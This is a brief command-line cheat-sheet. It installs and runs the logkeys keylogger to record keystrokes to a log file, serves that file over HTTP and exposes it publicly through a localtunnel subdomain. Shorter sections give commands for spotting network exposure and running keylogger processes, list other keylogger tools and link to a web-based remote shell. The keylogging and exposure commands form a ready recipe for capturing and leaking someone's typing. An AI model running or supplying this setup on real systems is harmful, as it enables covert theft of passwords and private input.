# Keylogger and expose to ftp server 

sudo pacman -S logkeys
sudo logkeys -s -d event3 --output test.log                                                     ~
sudo tail --follow test.log    
python -m http.server 80
lt --local-host 0.0.0.0 --port 80 --subdomain dummy987656


# Detecting network expose 
ss -natu
netstat -apv 

# lkl, uberkey, THC-vlogger, PyKeylogger, logkeys
ps aux | grep logkeys

#Shell in a box 
https://www.geeksforgeeks.org/shell-in-a-box-remote-linux-server-via-web-browser/